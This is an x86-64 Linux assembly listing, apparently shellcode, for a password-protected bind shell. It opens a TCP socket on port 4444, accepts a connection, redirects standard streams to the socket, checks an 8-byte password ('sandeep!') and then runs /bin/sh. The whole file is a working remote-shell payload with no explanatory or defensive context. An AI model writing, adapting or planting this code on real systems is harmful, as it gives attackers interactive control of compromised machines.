section .text

global _start

_start:
	push 41
	pop rax
	push 2
	pop rdi
	push 1
	pop rsi
	xor rdx,rdx
	syscall

	xchg rdi,rax

	push rdx
	mov dword[rsp-4],edx
	mov word[rsp-6],0x5c11
	mov word[rsp-8],0x2
	sub rsp,8
	mov rsi,rsp

	push 16
	pop rdx
	push 49
	pop rax
	syscall


	; listen

	push 50
	pop rax
	xor rsi,rsi
	syscall

	; accept

	push 43
	pop rax
	xor rdx,rdx
	syscall

	push rax
	; close

	push 3
	pop rax
	syscall

	
	pop rdi
	push 2
	pop rsi

dup2:
	push 33
	pop rax
	syscall
	dec rsi
	jns dup2

	xor rax,rax
	sub rsp,8
	mov rsi,rsp
	push 8
	pop rdx
	syscall

	push rdi 
	mov rax,0x21706565646e6173
	mov rdi,rsi
	scasq
	jnz exit
	
	xor rsi,rsi
	push rsi
	mov rdi,0x68732f6e69622f2f
	push rdi
	mov rdi,rsp
	push rsi
	push rdi
	mov rsi,rsp

	xor rdx,rdx
	push 59
	pop rax
	syscall


exit:
	pop rdi
	push 3
	pop rax
	syscall

	push 60
	pop rax
	xor rdi,rdi
	syscall

